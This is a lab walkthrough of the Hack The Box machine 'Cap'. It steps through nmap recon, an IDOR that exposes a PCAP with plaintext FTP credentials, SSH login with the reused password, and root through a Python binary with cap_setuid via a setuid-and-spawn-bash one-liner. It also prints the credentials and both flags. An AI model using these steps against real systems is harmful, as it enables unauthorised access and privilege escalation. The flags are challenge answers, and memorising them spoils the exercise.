All right, let’s dive into the HTB machine **Cap**, rated Easy. I’ll walk you through the recon, the initial foothold via an IDOR, the privilege‑escalation using a mis‑configured Linux capability, and finish with the key takeaway for anyone doing red‑team or blue‑team work.

**Recon**  
We start with a full‑service scan:  

```bash
nmap -sC -sV 10.129.19.233
```  

The scan returns three open ports:  

- **21/tcp** – vsftpd 3.0.3  
- **22/tcp** – OpenSSH 8.2p1 on Ubuntu 4ubuntu0.2  
- **80/tcp** – Gunicorn serving a web app called “Security Dashboard”.

Anonymous FTP login is tried and fails, so we turn to the web interface. The dashboard offers three endpoints: `/capture`, `/ip`, and `/netstat`. `/capture` always issues a 302 redirect to `/data/1`, but by manually requesting lower IDs we discover an IDOR:

```bash
curl -s http://10.129.19.233/data/0
```  

That returns a page with a **Download** button linking to `/download/0`. The same pattern works for `/download/1`, `/download/2`, etc., indicating sequential, unchecked numeric IDs.

**Exploitation – IDOR → plaintext FTP creds**  
We grab the PCAP from `/download/0`:

```bash
curl -s http://10.129.19.233/download/0 -o capture.pcap
```  

Then we inspect it with tshark, filtering for FTP traffic:

```bash
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```  

The output shows the FTP session in clear text:

```
USER    nathan
PASS    Buck3tH4TF0RM3!
```  

Those credentials are reused for SSH:

```bash
ssh nathan@10.129.19.233
```  

Password: **Buck3tH4TF0RM3!**  
We land as user *nathan* and retrieve the user flag: `2874475212d535da1ca01f207b3a6939`.

**Privilege Escalation – Linux capability abuse**  
Post‑user enumeration we run a capability search:

```bash
getcap -r / 2>/dev/null
```  

The result highlights a mis‑configured Python binary:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```  

The `cap_setuid` flag lets the process change its own UID to 0 without needing a SUID bit. We exploit it with a one‑liner:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```  

Spawning a shell gives us root (`uid=0(root)`) and we can read the root flag: `006b90cfdd1f951eb31fe3278eb85847`.
